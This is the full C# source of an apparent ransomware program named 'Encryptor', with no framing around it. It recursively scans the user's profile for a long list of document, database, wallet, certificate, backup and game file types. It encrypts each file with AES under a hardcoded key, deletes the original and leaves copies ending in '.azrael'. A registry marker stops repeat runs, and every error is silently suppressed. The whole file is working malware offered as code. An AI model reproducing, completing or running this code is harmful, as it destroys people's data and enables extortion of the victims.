using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Encryptor
{
    internal class Program
    {
        private static Mutex mutex;

        static void Main(string[] args)
        {
            const string mutexName = "azrXxX"; // reg-value
            const string registryKeyPath = @"SOFTWARE\ExampleMutex"; // Path to reg-key

            if (IsMutexAlreadyExist(mutexName, registryKeyPath))
            {
                return;
            }

            CreateMutexAndWriteToRegistry(mutexName, registryKeyPath);

            string basePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string fileListPath = Path.Combine("C:\\Users\\Public\\Videos", "azrael.log"); // Output-log
            byte[] key = Encoding.UTF8.GetBytes("lkirwf897+22#bbtrm8814z5qq=498j5"); // Your own aes-key to encrypt

            try
            {
                using (StreamWriter fileListFile = new StreamWriter(fileListPath))
                {
                    RecursiveSearch(basePath, fileListFile);
                }

                EncryptFiles(fileListPath, key);
#if DEBUG 
                Console.WriteLine("Encryption complete.");
#endif
            }
            catch { } // заглушка
        }

        private static void RecursiveSearch(string basePath, StreamWriter fileListFile)
        {
            string[] allowedExtensions = new string[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".jpeg",
                ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml",
                ".psd", ".mp4", ".7z", ".rar", ".m4a", ".bmp", ".wma", ".avi", ".wmv", ".d3dbsp",
                ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
                ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
                ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg",
                ".map", ".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid",
                ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
                ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh",
                ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta",
                ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das",
                ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
                ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".wallet", ".wotreplay",
                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7",
                ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef",
                ".ptx", ".r3d", ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef",
                ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr",
                ".dng", ".jpe", ".cdr", ".indd", ".ai", ".eps", ".pdd", ".dbf", ".mdf", ".wb2",
                ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx",
                ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".pdf", ".exe", ".lnk", ".mp3", ".bak"
            };

            try
            {
                foreach (string file in Directory.GetFiles(basePath))
                {
                    string ext = Path.GetExtension(file);
                    if (ext != null && allowedExtensions.Contains(ext, StringComparer.OrdinalIgnoreCase))
                    {
                        fileListFile.WriteLine(file);
                    }
                }

                foreach (string directory in Directory.GetDirectories(basePath))
                {
                    RecursiveSearch(directory, fileListFile); // Corrected method call
                }
            }
            catch { } // заглушка
        }
        private static void EncryptFiles(string fileListPath, byte[] key)
        {
            try
            {
                using (StreamReader fileReader = new StreamReader(fileListPath))
                {
                    while (!fileReader.EndOfStream)
                    {
                        string filePath = fileReader.ReadLine();
                        try
                        {
                            string encryptedFilePath = filePath + ".azrael";
                            EncryptFile(filePath, encryptedFilePath, key);
                        }
                        catch { } // заглушка
                    }
                }
            }
            catch { } // заглушка
        }

        private static void EncryptFile(string inputFile, string outputFile, byte[] key)
        {
            try
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = key;
                    aesAlg.Mode = CipherMode.CBC;
                    aesAlg.GenerateIV();

                    // Чтение исходного файла в буфер
                    byte[] fileBytes;
                    using (FileStream inputStream = new FileStream(inputFile, FileMode.Open))
                    {
                        fileBytes = new byte[inputStream.Length];
                        inputStream.Read(fileBytes, 0, fileBytes.Length);
                    }

                    // Удаление исходного файла
                    File.Delete(inputFile);

                    // Создание нового файла и запись в него зашифрованного содержимого
                    using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
                    using (ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV))
                    using (CryptoStream cryptoStream = new CryptoStream(outputStream, encryptor, CryptoStreamMode.Write))
                    {
                        outputStream.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                        cryptoStream.Write(fileBytes, 0, fileBytes.Length);
                    }
                }
            }
            catch { } // заглушка
        }

        private static bool IsMutexAlreadyExist(string mutexName, string registryKeyPath)
        {
            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
            {
                return registryKey.GetValue(mutexName) != null;
            }
        }

        private static void CreateMutexAndWriteToRegistry(string mutexName, string registryKeyPath)
        {
            mutex = new Mutex(true, mutexName);

            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
            {
                registryKey.SetValue(mutexName, 1);
            }
        }
    }
}
